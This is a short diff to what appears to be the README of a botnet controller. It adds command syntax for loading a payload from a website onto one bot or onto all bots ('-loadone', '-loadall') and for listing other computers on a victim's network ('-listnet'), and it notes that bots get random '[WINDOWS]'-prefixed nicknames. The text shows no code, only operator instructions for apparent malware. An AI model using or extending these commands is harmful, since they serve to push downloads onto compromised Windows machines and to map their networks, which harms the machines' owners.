@@ -7,9 +7,9 @@ here you go.
 
 Features:
 
-1. load to one bot
-2. load to all bots
-3. get a list of other computers on the network
+1. load to one bot     -loadone <BOT ID> <WEBSITE>
+2. load to all bots    -loadall <WEBSITE>
+3. get a list of other computers on the network     -listnet <BOT ID>
 
 all bots have a randomly generated nickname prefaced by [WINDOWS]
 
